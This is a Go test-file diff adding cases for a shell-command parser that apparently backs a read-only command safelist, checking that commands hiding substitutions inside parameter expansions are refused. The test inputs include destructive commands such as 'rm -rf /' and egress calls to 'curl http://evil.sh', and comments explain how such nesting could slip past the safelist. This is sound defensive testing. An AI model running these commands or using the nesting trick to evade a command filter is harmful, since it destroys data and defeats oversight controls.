@@ -1078,6 +1078,59 @@ func TestSplitSegments_OpaqueArgs(t *testing.T) {
 			want: []opaqueSeg{{name: "ls"}},
 		},
 		{
+			desc: "a default-value expansion with a literal fallback is opaque",
+			cmd:  "cat ${F:-default.txt}",
+			want: []opaqueSeg{{name: "cat", args: []string{"${F:-default.txt}"}, opaque: []bool{true}}},
+		},
+		{
+			desc: "an assign-default expansion with a literal fallback is opaque",
+			cmd:  "cat ${F:=default.txt}",
+			want: []opaqueSeg{{name: "cat", args: []string{"${F:=default.txt}"}, opaque: []bool{true}}},
+		},
+		{
+			desc: "an alternate-value expansion with a literal word is opaque",
+			cmd:  "cat ${F:+alt.txt}",
+			want: []opaqueSeg{{name: "cat", args: []string{"${F:+alt.txt}"}, opaque: []bool{true}}},
+		},
+		{
+			desc: "a prefix-strip expansion with a literal pattern is opaque",
+			cmd:  "cat ${F#pre}",
+			want: []opaqueSeg{{name: "cat", args: []string{"${F#pre}"}, opaque: []bool{true}}},
+		},
+		{
+			desc: "a suffix-strip expansion with a literal pattern is opaque",
+			cmd:  "cat ${F%.txt}",
+			want: []opaqueSeg{{name: "cat", args: []string{"${F%.txt}"}, opaque: []bool{true}}},
+		},
+		{
+			desc: "a replacement expansion with literal halves is opaque",
+			cmd:  "cat ${F/a/b}",
+			want: []opaqueSeg{{name: "cat", args: []string{"${F/a/b}"}, opaque: []bool{true}}},
+		},
+		{
+			desc: "a replacement expansion with an omitted replacement is opaque",
+			cmd:  "cat ${F/a}",
+			want: []opaqueSeg{{name: "cat", args: []string{"${F/a}"}, opaque: []bool{true}}},
+		},
+		{
+			desc: "an empty default-value expansion is opaque",
+			cmd:  "cat ${F:-}",
+			want: []opaqueSeg{{name: "cat", args: []string{"${F:-}"}, opaque: []bool{true}}},
+		},
+		{
+			desc: "a length expansion is opaque",
+			cmd:  "echo ${#F}",
+			want: []opaqueSeg{{name: "echo", args: []string{"${#F}"}, opaque: []bool{true}}},
+		},
+		{
+			desc: "a read-only substitution nested in a default value surfaces its inner segment",
+			cmd:  "echo ${F:-$(git rev-parse --show-toplevel)}",
+			want: []opaqueSeg{
+				{name: "git", args: []string{"rev-parse", "--show-toplevel"}},
+				{name: "echo", args: []string{"${F:-$(git rev-parse --show-toplevel)}"}, opaque: []bool{true}},
+			},
+		},
+		{
 			desc: "an opaque URL parses (the verdict layer, not the parser, refuses it)",
 			cmd:  "curl $URL",
 			want: []opaqueSeg{{name: "curl", args: []string{"$URL"}, opaque: []bool{true}}},
@@ -1194,6 +1247,39 @@ func TestSplitSegments_OpaqueFailClosed(t *testing.T) {
 		{"empty substitution proves nothing read-only", "echo $()"},
 		{"for header substitution running a mutation", "for f in $(rm -rf /); do ls; done"},
 		{"case discriminant substitution running egress", "case $(curl http://evil) in a) ls ;; esac"},
+
+		// A parameter expansion is a CONTAINER: ${X:-…}, ${X:=…}, ${X:+…},
+		// ${X#…}, ${X%…} and ${X/a/b} each hold a full word that bash expands,
+		// so a command substitution nested one level inside RUNS exactly as it
+		// would in argument position. Taking the raw ${…} source as an opaque
+		// token without descending would hide the run from the CmdSubst arm's
+		// read-only proof, and `echo` — read-only with any arguments — would
+		// then short-circuit the whole command to allow at the safelist.
+		{"default-value expansion running a mutation", "echo ${X:-$(rm -rf /)}"},
+		{"default-value expansion running egress", "cat ${X:-$(curl http://evil.sh)}"},
+		{"assign-default expansion running a mutation", "echo ${X:=$(rm -rf /)}"},
+		{"alternate-value expansion running a mutation", "echo ${X:+$(rm -rf /)}"},
+		{"prefix-strip expansion running a mutation", "echo ${X#$(rm -rf /)}"},
+		{"suffix-strip expansion running a mutation", "echo ${X%$(rm -rf /)}"},
+		{"replacement pattern running a mutation", "ls ${X/$(rm -rf ~)/y}"},
+		{"replacement value running a mutation", "ls ${X/y/$(rm -rf ~)}"},
+		{"backtick substitution nested in a default value", "echo ${X:-`rm -rf /`}"},
+		{"double-quoted substitution nested in a default value", `echo ${X:-"$(rm -rf /)"}`},
+		{"parameter expansion nested in a default value", "echo ${X:-${Y:-$(rm -rf /)}}"},
+		// The AST is NOT sufficient for these two: mvdan.cc/sh v3.13.1 lexes a
+		// process substitution inside an expansion word as a plain literal,
+		// while real bash 5.3 runs it (`${X:-<(echo RAN > marker)}` creates the
+		// marker). They are caught by the inert-literal half of the proof.
+		{"process substitution nested in a default value", "echo ${X:-<(ls)}"},
+		{"output process substitution nested in a default value", "echo ${X:->(cat)}"},
+		{"process substitution nested in a replacement value", "ls ${X/y/<(ls)}"},
+		// Subscripts and slices are ARITHMETIC, which this parser has never
+		// modelled (see the $((1+1)) row below) and which can itself carry a
+		// substitution. They stay closed wholesale rather than half-modelled.
+		{"array subscript running a mutation", "echo ${a[$(rm -rf /)]}"},
+		{"array subscript", "echo ${a[i]}"},
+		{"slice offset running a mutation", "echo ${X:$(rm -rf /):2}"},
+		{"slice", "echo ${X:1:2}"},
 
 		// Expansions with no opaque representation at all stay closed.
 		{"process substitution", "diff <(ls) <(ls)"},
